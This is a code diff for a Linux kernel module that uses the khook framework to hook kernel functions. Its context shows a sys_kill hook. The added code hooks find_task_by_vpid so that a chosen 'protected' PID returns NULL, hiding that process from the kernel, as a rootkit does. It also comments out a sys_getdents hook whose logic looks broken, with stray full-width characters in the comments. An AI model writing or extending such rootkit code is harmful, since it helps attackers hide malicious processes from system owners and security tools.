@@ -205,12 +205,19 @@ static long khook_sys_kill(pid_t pid, int sig) {
 	return ret;
 }
 
-
-KHOOK_EXT(long, sys_getdents, struct linux_dirent64 __user *, unsigned int);
-static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
- 	long ret;
- 	ret = KHOOK_ORIGIN(fd, dirp, count);
-	return (ret+1);
+KHOOK_EXT(struct task_struct *, find_task_by_vpid, pid_t);
+static task_struct *khook_find_task_by_vpid(pid_t vnr){
+	struct task_struct *tsk = NULL;
+	tsk=KHOOK_ORIGIN(find_task_by_vpid, vnr);
+	find_pid();
+	if(protected_pid==vnr) tsk=NULL; 
+	return tsk;
+}
+// KHOOK_EXT(long, sys_getdents, struct linux_dirent64 __user *, unsigned int);
+// static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
+//  	long ret;
+//  	ret = KHOOK_ORIGIN(fd, dirp, count);
+// 	return (ret+1);
 // 	long value=0;
 // 　	struct inode *dinode;
 // 　　int len = 0;
@@ -237,7 +244,7 @@ static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *di
 // 　　if(tlen)
 // 　　dirp = (struct linux_dirent64 *) ((char *)dirp + dirp->d_reclen);
 // 　　}　　
-}
+//}
 
 
 
